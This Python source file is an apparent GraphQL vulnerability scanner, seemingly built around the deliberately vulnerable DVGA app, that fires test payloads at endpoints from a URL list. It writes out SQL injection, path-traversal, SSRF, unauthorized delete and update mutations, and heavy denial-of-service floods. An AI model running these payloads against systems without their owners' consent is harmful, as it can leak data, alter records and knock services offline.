import requests
import json
from dvga_tests import *

def print_banner():
    banner = r"""
    ========================================================================================================================================================================
    
     ██████  ██████   █████  ██████  ██   ██  ██████  ██          ███████  ██████  █████  ███    ██ ███    ██ ███████ ██████  
    ██       ██   ██ ██   ██ ██   ██ ██   ██ ██    ██ ██          ██      ██      ██   ██ ████   ██ ████   ██ ██      ██   ██ 
    ██   ███ ██████  ███████ ██████  ███████ ██    ██ ██          ███████ ██      ███████ ██ ██  ██ ██ ██  ██ █████   ██████  
    ██    ██ ██   ██ ██   ██ ██      ██   ██ ██ ▄▄ ██ ██               ██ ██      ██   ██ ██  ██ ██ ██  ██ ██ ██      ██   ██ 
     ██████  ██   ██ ██   ██ ██      ██   ██  ██████  ███████     ███████  ██████ ██   ██ ██   ████ ██   ████ ███████ ██   ██ 
                                                ▀▀                                                                           

    ========================================================================================================================================================================
                                                                                                                                                                      
    """
    print(banner)
    print("Welcome to the GRAPHQL Scanner")
    print("This tool tests various GraphQL security vulnerabilities on specified endpoints.\n")


# GRAPHQL_URL = "http://127.0.0.1:31337/index.php?graphql"

# Define the GraphQL endpoint URL
def load_endpoints(filename):
    with open(filename, "r") as file:
        for line in file:
            yield json.loads(line)['url']


def print_red(text):
    print("\033[91m{}\033[0m".format(text))

def print_green(text):
    print("\033[92m{}\033[0m".format(text))

def check_resource_request(url):
    resource_query = {
        'query': '''{
            __type(name: "User") {
                name
                fields {
                    name
                    type {
                        name
                        kind
                        ofType {
                            name
                            kind
                        }
                    }
                }
            }
        }'''}

    try:
        response = requests.post(url, json=resource_query)
        response.raise_for_status()
        response_json = response.json()

        if 'data' in response_json and '__type' in response_json['data']:
            # print_red("[!] Excessive resource request vulnerability found at {}".format(url))
            # print("Evidence:", json.dumps(response_json, indent=4))
            return "Excessive resource request vulnerability found."
        else:
            # print_green("[-] No excessive resource request vulnerability found at {}".format(url))
            return "Excessive resource request vulnerability not found."
    except Exception as e:
        return "Error during resource request check."
    
def test_dos_attack(url):
    query = "query { systemUpdate }" * 100 
    print("Running DoS attack test...")
    try:
        status_codes = []
        for i in range(100):  
            response = requests.post(url, json={"query": query})
            status_codes.append(response.status_code)
        # print_green("[+] DoS attack test status codes: {}".format(status_codes))
        if 200 not in status_codes:
            # print_green("[+] DoS attack test successful.")
            return "DoS attack vulnerability not found."
        else:
            # print_red("[-] DoS attack test failed: Server responded with 200 status code.")
            return "DoS attack vulnerability found."
    except Exception as e:
        # print_red("[-] DoS attack test failed: {}".format(e))
        return "DoS attack test failed."

def test_alias_attack(url):
    query_list = []
    for i in range(100):
        alias = f"q{i}: systemUpdate"
        query_list.append(alias)

    query = "\n".join(query_list)
    print("Running alias-based attack test...")
    try:
        status_codes = []
        for i in range(100):  
            response = requests.post(url, json={"query": query})
            status_codes.append(response.status_code)
        # print_green("[+] Alias-based attack test status codes: {}".format(status_codes))
        if 200 not in status_codes:
            # print_green("[+] Alias-based attack test successful.")
            return " Alias-based attack vulnerability not found."
        else:
            # print_red("[-] Alias-based attack test failed: Server responded with 200 status code.")
            return " Alias-based attack vulnerability found."

    except Exception as e:
        # print_red("[-] Alias-based attack test failed: {}".format(e))
        return "Alias-based attack test failed."

def test_sensitive_data(url):
    sensitive_fields = [
        'email',
        'password',
        'creditCardNumber',
    ]

    print("Running sensitive data test...")
    try:
        for field in sensitive_fields:
            sensitive_query = {
                'query': f'''
                {{
                    search(query: "{field}") {{
                        id
                        {field}
                    }}
                }}
                '''
            }
            response = requests.post(url, json=sensitive_query)
            response.raise_for_status()
            response_json = response.json()

            if 'data' in response_json and 'search' in response_json['data']:
                # print_red("[!] Sensitive data leak detected in field: {}".format(field))
                # print("Evidence:", json.dumps(response_json, indent=4))
                return "Sensitive data leak vulnerability found."
            else:
                # print_green("[-] No sensitive data leak detected in field: {}".format(field))
                return "Sensitive data leak vulnerability not found."
    except Exception as e:
        # print("Error during sensitive data test:", e)
        return "Sensitive data leak test not applicable."

def test_deep_recursion_attack(url):
    deep_query = 'query { user { friends { friends { friends { id } } } } }'
    try:
        response = requests.post(url, json={"query": deep_query})
        if response.status_code == 200:
            # print_red("[-] Deep recursion query handling may be inadequate.")
            return "Deep recursion query handling vulnerability found."
        else:
            # print_green("[+] Server managed deep recursion safely.")
            return "Deep recursion query handling vulnerability not found."
    except Exception as e:
        # print_red(f"[-] Deep recursion test failed: {e}")
        return "Deep recursion test failed."

def test_ssrf_vulnerability(url):
    # Mutation query attempting to access a potentially private internal service
    ssrf_query = """
    mutation {
      importPaste(host:"localhost", port:8080, path:"/", scheme:"http") {
        result
      }
    }
    """
    headers = {'Content-Type': 'application/json'}
    payload = {'query': ssrf_query}

    try:
        print("Running SSRF attack test...")
        response = requests.post(url, json=payload, headers=headers)
        if response.status_code == 200:
            # print_red("[!] SSRF attack may be possible.")
            # print("Response data:", response.json())
            return "SSRF attack vulnerability found."
        else:
            # print_green(f"[-] SSRF attack test failed with status code: {response.status_code}")
            return "SSRF attack vulnerability not found."
    except Exception as e:
        return "Failed to send SSRF test request."

def test_sql_injection(url):
    sql_injection_query = """
    query {
      pastes(filter:"aaa ' or 1=1--") {
          content
          title
      }
    }
    """
    headers = {'Content-Type': 'application/json'}
    payload = {'query': sql_injection_query}

    try:
        print("Running SQL injection test...")
        response = requests.post(url, json=payload, headers=headers)
        if response.status_code == 200 and 'data' in response.json():
            # print_red("[!] SQL injection may be possible.")
            # print("Response data:", response.json())
            return "SQL injection vulnerability found."
        else:
            # print_green(f"[-] SQL injection test did not execute with usual symptoms, status code: {response.status_code}")
            return "SQL injection vulnerability not found."
    except Exception as e:
        return "Failed to send SQL injection test request."

def test_path_traversal(url):
    path_traversal_query = """
    mutation {
      uploadPaste(filename:"../../../../../tmp/file.txt", content:"hi"){
        result
      }
    }
    """
    headers = {'Content-Type': 'application/json'}
    payload = {'query': path_traversal_query}

    try:
        print("Running path traversal test...")
        response = requests.post(url, json=payload, headers=headers)
        if response.status_code == 200:
            response_data = response.json()
            if response_data.get('data') and response_data['data']['uploadPaste']['result']:
                # print_red("[!] Path traversal attack may be possible.")
                return "Path traversal attack vulnerability found."
                # print("Response data:", response_data)
            else:
                # print_green("[-] Path traversal test did not execute successfully, status code: {response.status_code}")
                return "Path traversal attack vulnerability not found."
        else:
            # print_green(f"[-] Path traversal test failed with status code: {response.status_code}")
            return "Path traversal attack vulnerability not found."
    except Exception as e:
        # print_red(f"Failed to send path traversal test request: {e}")
        return "Path traversal test not applicable."


def test_permissions(url):
    sensitive_query = """
    mutation {
      deleteUser(userId: "12345") {
        result
      }
    }
    """
    headers = {'Content-Type': 'application/json'}
    payload = {'query': sensitive_query}

    print("Running permissions test...")
    response = requests.post(url, json=payload, headers=headers)
    if response.status_code == 403 or response.status_code == 401:
        # print_green("[+] Proper authorization checks are in place.")
        return "Proper authorization checks vulnerability not found."
    else:
        # print_red("[-] Permissions test failed, unauthorized actions might be possible.")
        return "Proper authorization checks vulnerability found."

def test_introspection(url):
    introspection_query = {
        "query": """
        query IntrospectionQuery {
            __schema {
                queryType { name }
                mutationType { name }
                subscriptionType { name }
                types {
                    name
                }
                directives {
                    name
                }
            }
        }
        """
    }
    headers = {'Content-Type': 'application/json'}
    print("Running introspection test...")
    try:
        response = requests.post(url, json=introspection_query, headers=headers)
        response.raise_for_status()  
        data = response.json()
        if data.get('data', {}).get('__schema'):
            # print_red("[-] Introspection is enabled and could leak sensitive schema information.")
            return "Introspection test vulnerability found."
        else:
            # print_green("[+] Introspection is properly restricted.")
            return "Introspection test vulnerability not found."
    except requests.exceptions.HTTPError as err:
        return "HTTP error occurred."
    except requests.exceptions.RequestException as e:
        return "An error occurred during the request."
    except ValueError:
        return "Failed to decode JSON from response."
    
def test_getUsers(url):
    getUsers_query = {
        'query': '''
        query getUsers{
          users(where:{role:ADMINISTRATOR}){
            edges{
              node{
                userId
                name
              }
            }
          }
        }
        '''
    }

    try:
        response = requests.post(url, json=getUsers_query)
        response.raise_for_status()
        response_json = response.json()

        if 'data' in response_json and 'users' in response_json['data']:
            # print_green("[+] getUsers testcase successfully executed.")
            return "Get users vulnerability found."
            # print("Response:", json.dumps(response_json, indent=4))
        else:
            # print_red("[-] getUsers testcase failed.")
            return "Get users vulnerability not found."
    except Exception as e:
        # print("Error during getUsers testcase execution:", e)
        return "Get users test not applicable."

def test_denialOfService(url):
    FORCE_MULTIPLIER = 10000
    CHAINED_REQUESTS = 1000

    queries = []

    payload = 'content \n comments { \n nodes { \n content } }' * FORCE_MULTIPLIER
    query = {'query':'query { \n posts { \n nodes { \n ' + payload + '} } }'}

    for _ in range(0, CHAINED_REQUESTS):
        queries.append(query)

    r = requests.post(url, json=queries)
    # print_green("[+] denialOfService testcase successfully executed.")
    return "DenialOfService test successful. Time took {} seconds".format(r.elapsed.total_seconds())
    # print('Time took: {} seconds '.format(r.elapsed.total_seconds()))
    # print('Response:', r.json())
    
def test_unauthorized_comment(url):
    headers = {
        'Content-Type': 'application/json',
    }
    postID = "1" 
    userID = "2" 
    comment = "This is a test comment."  # Comment to be posted
    payload = {
        "query": """
            mutation {
                createComment(input: {
                    postId: %d,
                    userId: %d,
                    content: "%s",
                    clientMutationId: "UWHATM8",
                }) {
                    clientMutationId
                }
            }
        """ % (int(postID), int(userID), comment)
    }

    try:
        response = requests.post(url, data=json.dumps(payload), headers=headers)
        if response.status_code == 200 and 'UWHATM8' in response.text:
            # print_green("[+] Comment posted on article ID")
            return "Unauthorized comment vulnerability found."
        else:
            # print_red("\n[-] Error posting the comment. Check that postID and userID are correct")
            return "Unauthorized comment vulnerability not found."
    except Exception as e:
        # print_red("\n[-] An error occurred while posting the comment")
        return "\nAn error occurred while testing unauthorized comment."

# checks the server's ability to handle multiple, resource-intensive queries
def test_batching_attack(url):
    batch_queries = [{'query': '{ users { id, posts { id, title, comments { id, content } } } }'} for _ in range(50)]
    try:
        response = requests.post(url, json=batch_queries)
        if response.status_code == 200:
            # print_red("[!] Batching attack may be possible. Server responded with 200 OK.")
            return "Batching attack vulnerability found."
        else:
            # print_green("[-] Batching attack mitigated. Response status: {}".format(response.status_code))
            return "Batching attack vulnerability not found."
    except Exception as e:
        return "Batching attack test failed."

def test_field_limiting(url):
    # Attempt to request an excessive number of fields
    query = 'query { user { ' + ' '.join(f'field{i}' for i in range(1000)) + ' } }'
    try:
        response = requests.post(GRAPHQL_URL, json={"query": query})
        if response.status_code == 400 and 'too many fields' in response.text.lower():
            # print_green("[+] Field limiting is enforced.")
            return "Field limiting vulnerability not found."
        else:
            # print_red("[-] No field limiting detected, potential vulnerability.")
            return "Field limiting vulnerability found."
    except Exception as e:
        # print_red(f"[-] Field limiting test failed: {e}")
        return "Field limiting test not applicable."


def test_unauthorized_mutation(url):
    mutation = 'mutation { updatePost(id: "1", data: { title: "New Title" }) { title } }'
    try:
        response = requests.post(url, json={"query": mutation})
        if response.status_code in [200, 201] and "title" in response.json().get('data', {}):
            # print_red("[!] Unauthorized mutation may be possible.")
            return "Unauthorized mutation vulnerability found."
        else:
            # print_green("[-] Mutation properly restricted.")
            return "Unauthorized mutation vulnerability not found."
    except Exception as e:
        return "Mutation test failed."

# if __name__ == "__main__":
#     print_banner()
#     choice = input("Do you want to enter an endpoint manually or use a JSON file? Enter 'manual' or 'json': ").strip().lower()
    
#     if choice == 'manual':
#         # Single endpoint provided by the user
#         GRAPHQL_URL = input("Enter the GraphQL endpoint URL: ")
#         endpoints = [GRAPHQL_URL]  
#     elif choice == 'json':
#         endpoints = load_endpoints("./valid_endpoints.json")
#     else:
#         print("Invalid choice. Exiting.")
#         exit()
#     for url in endpoints:
#         GRAPHQL_URL = url
#         print(f"Running test cases on {url}...")
#         test_introspection()
#         check_resource_request(url)
#         test_dos_attack()
#         test_alias_attack()
#         test_sensitive_data()
#         test_deep_recursion_attack()
#         test_ssrf_vulnerability()
#         test_sql_injection()
#         test_path_traversal()
#         test_permissions()
#         test_getUsers()
#         test_denialOfService(GRAPHQL_URL)
#        test_unauthorized_comment()
#         test_batching_attack()
#         test_field_limiting()
#         test_unauthorized_mutation()


        # test_capitalize_field_argument()
        # test_show_network_directive()
        # test_mutation_login_success()
        # test_mutation_login_error()
        # test_query_me()
        # test_query_me_operator()
        # test_batching()
        # test_batched_operation_names()
        # test_check_graphiql_cookie()
        # test_check_batch_disabled()
        # test_check_batch_enabled()
        # test_dvga_is_up()
        # test_graphql_endpoint_up()
        # test_graphiql_endpoint_up()
        # test_check_introspect_fields()
        # test_check_introspect_when_expert_mode()
        # test_check_introspect_mutations()
        # test_check_hardened_mode()
        # test_check_easy_mode()
        # test_mutation_createPaste()
        # test_mutation_editPaste()
        # test_mutation_deletePaste()
        # test_mutation_uploadPaste()
        # test_mutation_importPaste()
        # test_mutation_createUser()
        # test_mutation_createBurnPaste()
        # test_query_pastes()
        # test_query_paste_by_id()
        # test_query_systemHealth()
        # test_query_systemUpdate()
        # test_query_systemDebug()
        # test_query_users()
        # test_query_users_by_id()
        # test_query_read_and_burn()
        # test_query_search_on_user_object()
        # test_query_search_on_paste_object()
        # test_query_search_on_user_and_paste_object()
        # test_query_audits()
        # test_query_audits()
        # test_query_pastes_with_limit()
        # test_query_pastes_with_fragments()
        # test_check_rollback()
        # test_circular_query_pastes_owners()
        # test_aliases_overloading()
        # test_field_suggestions()
        # test_os_injection()
        # test_os_injection_alt()
        # test_xss()
        # test_log_injection()
        # test_html_injection()
        # test_sql_injection()
        # test_deny_list_expert_mode()
        # test_deny_list_expert_mode_bypass()
        # test_deny_list_beginner_mode()
        # test_circular_fragments()
        # test_stack_trace_errors()
        # test_check_websocket()
